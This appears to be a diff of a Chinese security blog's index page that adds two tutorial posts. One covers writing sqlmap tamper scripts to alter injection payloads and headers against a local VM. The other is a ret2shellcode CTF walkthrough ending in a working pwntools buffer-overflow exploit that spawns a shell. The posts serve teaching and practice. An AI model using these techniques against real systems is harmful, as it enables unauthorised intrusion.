@@ -75,6 +75,160 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-tools-sqlmap-script-build" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/21/tools-sqlmap-script-build/" class="article-date">
+  <time class="dt-published" datetime="2024-03-20T16:49:32.000Z" itemprop="datePublished">2024-03-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/21/tools-sqlmap-script-build/">tools-sqlmap-script-build</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQLMAP-tamper-的编写"><a href="#SQLMAP-tamper-的编写" class="headerlink" title="SQLMAP tamper 的编写"></a>SQLMAP tamper 的编写</h1><h2 id="0-关于-sqlmap-的-tamper"><a href="#0-关于-sqlmap-的-tamper" class="headerlink" title="0. 关于 sqlmap 的 tamper"></a>0. 关于 sqlmap 的 tamper</h2><p>​	在sqlmap的目录下，可以看到一个名字为tamper的文件，这个文件中，存放着sqlmap自带的脚本，我们也可以在其中创建自己的脚本，然后去针对不同的网站进行不同的绕过策略。我们通过对脚本的编写，可以修改sqlmap在攻击时所使用的payload或修改Header的值来进行更有针对性的攻击。</p>
+<h2 id="1-标准-tamper-脚本结构"><a href="#1-标准-tamper-脚本结构" class="headerlink" title="1. 标准 tamper 脚本结构"></a>1. 标准 tamper 脚本结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &#x27;doc/COPYING&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"># 当前脚本调用优先等级</span><br><span class="line">__priority__ = PRIORITY.LOW </span><br><span class="line"></span><br><span class="line"># 声明当前脚本适用/不适用的范围，可以为空。</span><br><span class="line">def dependencies(): </span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line"># 用于篡改Payload、以及请求头的主要函数</span><br><span class="line">def tamper(payload, **kwargs): </span><br><span class="line">  return payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-1-重要部分解析"><a href="#1-1-重要部分解析" class="headerlink" title="1.1 重要部分解析"></a>1.1 重要部分解析</h3><h4 id="1-1-1-priority-Param"><a href="#1-1-1-priority-Param" class="headerlink" title="1.1.1 priority [Param]"></a>1.1.1 priority [Param]</h4><p>​	priority定义脚本的优先级，用于在测试过程中选用多个tamper脚本的情况下测试的先后顺序。谁的优先级高，谁被优先使用。（优先级共有七个，分别为；LOWEST、LOWER、LOW、NORMAL、HIGH、HIGHER、HIGHEST）</p>
+<h4 id="1-1-2-dependencies-Fuction"><a href="#1-1-2-dependencies-Fuction" class="headerlink" title="1.1.2 dependencies [Fuction]"></a>1.1.2 dependencies [Fuction]</h4><p>​	dependencies函数声明该脚本适用&#x2F;不适用的范围，可以为空。</p>
+<h4 id="1-1-3-tamper-Fuction"><a href="#1-1-3-tamper-Fuction" class="headerlink" title="1.1.3 tamper [Fuction]"></a>1.1.3 tamper [Fuction]</h4><p>​	tamper是主要的函数，接受的参数为payload和**kwargs，返回值为替换后的payload。</p>
+<p>​	payload 拼接查询语句</p>
+<p>​	**kwargs 存储的是 HTTP REQUEST 请求头中的内容， 多数存储在 kwargs[‘headers’] 中</p>
+<h2 id="2-编写测试脚本并验证"><a href="#2-编写测试脚本并验证" class="headerlink" title="2. 编写测试脚本并验证"></a>2. 编写测试脚本并验证</h2><h3 id="2-1-开启HTTP服务"><a href="#2-1-开启HTTP服务" class="headerlink" title="2.1 开启HTTP服务"></a>2.1 开启HTTP服务</h3><p>​	在虚拟机中开启 HTTP 服务，模拟存在SQL注入的web服务</p>
+<p><img src="/images/image-20240321003450311.png" alt="image-20240321003450311"></p>
+<h3 id="2-2-编写测试脚本"><a href="#2-2-编写测试脚本" class="headerlink" title="2.2 编写测试脚本"></a>2.2 编写测试脚本</h3><p>​	我们尝试在每次发送的请求URL最后都加上fregment，其内容为”#just-for-test”，并设置请求头headers中”X-Forwarded-For”字段的数值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># self2test.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> kwargs[<span class="string">&#x27;headers&#x27;</span>].get(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> kwargs[<span class="string">&#x27;headers&#x27;</span>].get(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">        kwargs[<span class="string">&#x27;headers&#x27;</span>].setdefault(<span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        kwargs[<span class="string">&#x27;headers&#x27;</span>][<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;8.8.8.8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;#just-for-test&quot;</span>.<span class="built_in">format</span>(payload) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-BurpSuite-抓包监听"><a href="#2-3-BurpSuite-抓包监听" class="headerlink" title="2.3 BurpSuite 抓包监听"></a>2.3 BurpSuite 抓包监听</h3><p>​	设置 Bp 监听本地8080端口</p>
+<h3 id="2-4-运行脚本"><a href="#2-4-运行脚本" class="headerlink" title="2.4 运行脚本"></a>2.4 运行脚本</h3><blockquote>
+<p>python sqlmap.py –proxy&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> –tamper&#x3D;self2test -u “<a target="_blank" rel="noopener" href="http://192.168.70.196:8000/?id=1">http://192.168.70.196:8000/?id=1</a>*”</p>
+</blockquote>
+<p>​	使用--proxy参数指定代理地址为<a href="http://127.0.0.1:8080，将流量转发到BurpSuite上方便观察">http://127.0.0.1:8080，将流量转发到BurpSuite上方便观察</a></p>
+<p><img src="/images/image-20240321004123079.png" alt="image-20240321004123079"></p>
+<p>​	在流量包的数据中我们可以很清楚的看见URL中多出了个内容为”#just-for-test”的fregment，并且在请求头headers中”X-Forwarded-For”字段的数值也被设置了</p>
+<p><img src="/images/image-20240321004443797.png" alt="image-20240321004443797"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu01k36d000acuvdbxsyaumz" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-pwn-stackoverflow-ret2shellcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/20/pwn-stackoverflow-ret2shellcode/" class="article-date">
+  <time class="dt-published" datetime="2024-03-20T12:58:10.000Z" itemprop="datePublished">2024-03-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/20/pwn-stackoverflow-ret2shellcode/">pwn-stackoverflow-ret2shellcode</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="0-基础准备"><a href="#0-基础准备" class="headerlink" title="0 基础准备"></a>0 基础准备</h2><h3 id="0-1-ret2shellcode原理"><a href="#0-1-ret2shellcode原理" class="headerlink" title="0.1 ret2shellcode原理"></a>0.1 ret2shellcode原理</h3><p>​	ret2shellcode控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。</p>
+<h3 id="0-2-环境"><a href="#0-2-环境" class="headerlink" title="0.2 环境"></a>0.2 环境</h3><p>​	测试程序点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
+<h2 id="1-初步审计"><a href="#1-初步审计" class="headerlink" title="1 初步审计"></a>1 初步审计</h2><h3 id="1-1-保护机制检测"><a href="#1-1-保护机制检测" class="headerlink" title="1.1 保护机制检测"></a>1.1 保护机制检测</h3><p>​	首先，查看一下程序的保护机制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  checksec ret2shellcode</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-源码观察"><a href="#1-2-源码观察" class="headerlink" title="1.2 源码观察"></a>1.2 源码观察</h3><p>​	通过观察源程序可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="type">const</span> <span class="type">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	这里的代码与ret2text差不多相同，不过这次还同时将对应的字符串复制到 buf2 处</p>
+<h3 id="1-3-逆向分析"><a href="#1-3-逆向分析" class="headerlink" title="1.3 逆向分析"></a>1.3 逆向分析</h3><p>​	简单查看可知 buf2 在 bss 段</p>
+<blockquote>
+<p>.bss:0804A080                 public buf2<br>.bss:0804A080 ; char buf2[100]</p>
+</blockquote>
+<p>​	gdb 调试程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8	ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb9dbc (environ) —▸ 0xffffd59c —▸ 0xffffd70d ◂— 0x505f434c (&#x27;LC_P&#x27;)</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xaebb06ec</span><br><span class="line"> EDX  0xffffd524 ◂— 0x0</span><br><span class="line"> EDI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */</span><br><span class="line"> ESI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */</span><br><span class="line"> EBP  0xffffd4f8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd470 —▸ 0xffffd49e —▸ 0xffff0000 ◂— 0x0</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov    eax, dword ptr [0x804a060]</span><br><span class="line">────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">gef➤  vmmap </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/richard/Desktop/demo1/ret2shellcode</span><br><span class="line">0xf7e04000 0xf7e05000 rwxp     1000 0      </span><br><span class="line">0xf7e05000 0xf7fb5000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb6000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb6000 0xf7fb8000 r-xp     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb8000 0xf7fb9000 rwxp     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb9000 0xf7fbc000 rwxp     3000 0      </span><br><span class="line">0xf7fd4000 0xf7fd5000 rwxp     1000 0      </span><br><span class="line">0xf7fd5000 0xf7fd7000 r--p     2000 0      [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 22000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 23000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line">6-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>
+
+<p>​	因为buf2所在的内存地址为0x0804A080 ,处于[0x0804a000, 0x0804b000)区间内，所以这个区间就是 BSS 段在内存中的位置</p>
+<blockquote>
+<p>0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;richard&#x2F;Desktop&#x2F;demo1&#x2F;ret2shellcode</p>
+</blockquote>
+<p><strong>注意：如果观察到bss段不存在执行权限，可能是当前系统版本太高(在这里我使用的是ubuntu16.04)</strong></p>
+<p><img src="/images/image-20240320204423628.png" alt="image-20240320204423628"></p>
+<h2 id="2-确定偏移量"><a href="#2-确定偏移量" class="headerlink" title="2 确定偏移量"></a>2 确定偏移量</h2><h3 id="2-1-溢出报错确定偏移量"><a href="#2-1-溢出报错确定偏移量" class="headerlink" title="2.1 溢出报错确定偏移量"></a>2.1 溢出报错确定偏移量</h3><p>​	在 GDB 中，首先使用 pwndbg 的 cyclic 插件生成 200 个有序字符</p>
+<blockquote>
+<p>cyclic 200</p>
+</blockquote>
+<p><img src="/images/image-20240320205025701.png" alt="image-20240320205025701"></p>
+<p>​	然后运行程序至输入口，将生成的有序字符串作为 stdin 数据输入运行程序</p>
+<p><img src="/images/image-20240320205040321.png" alt="image-20240320205040321"></p>
+<p>​	继续运行程序，可以发现程序出错了，在0x62616164这个地址处出现错误，函数调用结束后会使用 ret 从栈中弹出一个数值作为 EIP 的数值，从而将下一条执行命令的地址修改为 EIP指向地址</p>
+<p><img src="/images/image-20240320205103128.png" alt="image-20240320205103128"></p>
+<p>​	然后使用 pwndbg 的 <code>cyclic -l</code>  查看在出错的字符前还有多少个字节的数据，可以看到在当前出错的数据前还有112个字符数据</p>
+<blockquote>
+<p>cyclic -l 0x62616164</p>
+</blockquote>
+<p><img src="/images/image-20240320173215041.png" alt="image-20240320173215041"></p>
+<h2 id="3-梳理逻辑，编写程序"><a href="#3-梳理逻辑，编写程序" class="headerlink" title="3 梳理逻辑，编写程序"></a>3 梳理逻辑，编写程序</h2><p>​	ret2shellcode，自己将shellcode写入可执行区域并执行</p>
+<p>​	所以我们需要输入这样一串字符：</p>
+<ul>
+<li><p>构建shell的汇编指令</p>
+</li>
+<li><p>112个字符数据(包括第一步构建的shell汇编指令和垃圾数据)</p>
+</li>
+<li><p>.bss:0x804a080内存地址</p>
+<p>最后的 payload 如下：</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu01k3660003cuvdd4xq936k" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-pwn-stackoverflow-ret2text" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/03/20/pwn-stackoverflow-ret2text/" class="article-date">
@@ -161,7 +315,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="cltzpg6og0003ilvd08k97rhw" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="clu01k3690005cuvd657e50d6" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -227,7 +381,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="cltzpg6ou0005ilvd18grblgf" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="clu01k36a0006cuvd5ruchz0p" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -353,7 +507,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="cltzpg6ob0001ilvd0syvhwi7" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="clu01k3620001cuvd8fnk4kds" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -500,7 +654,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="cltzpg6oz0006ilvdg206dg29" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="clu01k36b0007cuvdacy8ew7j" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -561,7 +715,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" data-id="cltzpg6p4000ailvdfjdsc9kx" data-title="vulnhub-LAMPSecurity-CTF5-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" data-id="clu01k36g000dcuvdb1e6ge9v" data-title="vulnhub-LAMPSecurity-CTF5-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -710,7 +864,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="cltzpg6p5000bilvda6dj3qaw" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="clu01k36k000fcuvd5aaodzzj" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -830,7 +984,7 @@
 <p><img src="/images/image-20230317151548630.png" alt="image-20230317151548630"></p>
 <p>​		尝试使用上面的用户名和密码进行SSH链接</p>
 <blockquote>
-<p>ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -oHostKeyAlgorithms&#x3D;+ssh-dss -oCiphers&#x3D;+3des-cbc <a href="mailto:&#x64;&#x73;&#116;&#101;&#x76;&#101;&#110;&#115;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x33;&#52;&#x2e;&#x31;&#51;&#54;">&#x64;&#x73;&#116;&#101;&#x76;&#101;&#110;&#115;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x33;&#52;&#x2e;&#x31;&#51;&#54;</a></p>
+<p>ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -oHostKeyAlgorithms&#x3D;+ssh-dss -oCiphers&#x3D;+3des-cbc <a href="mailto:&#x64;&#115;&#x74;&#101;&#118;&#101;&#x6e;&#115;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#x33;&#x34;&#46;&#x31;&#x33;&#x36;">&#x64;&#115;&#x74;&#101;&#118;&#101;&#x6e;&#115;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#x33;&#x34;&#46;&#x31;&#x33;&#x36;</a></p>
 </blockquote>
 <p><img src="/images/image-20230317144444254.png" alt="image-20230317144444254"></p>
 <p>​		成功连接上主机，可以发现我们是一个低权限账号，下面我们就该提权限了</p>
@@ -847,7 +1001,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" data-id="cltzpg6p00007ilvd2mq2f1tv" data-title="vulnhub-LAMPSecurity-CTF4.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" data-id="clu01k36e000bcuvd6fnfgoxn" data-title="vulnhub-LAMPSecurity-CTF4.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -884,7 +1038,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 20px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 16.67px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 16.67px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
     </div>
   </div>
 
@@ -906,6 +1060,14 @@
       <ul>
         
           <li>
+            <a href="/2024/03/21/tools-sqlmap-script-build/">tools-sqlmap-script-build</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/20/pwn-stackoverflow-ret2shellcode/">pwn-stackoverflow-ret2shellcode</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/20/pwn-stackoverflow-ret2text/">pwn-stackoverflow-ret2text</a>
           </li>
         
@@ -915,14 +1077,6 @@
         
           <li>
             <a href="/2024/03/15/protocol-arp/">protocol-arp</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/15/tools-netdiscover/">tools-netdiscover</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/">vulnhub-LAMPSecurity-CTF5-external</a>
           </li>
         
       </ul>
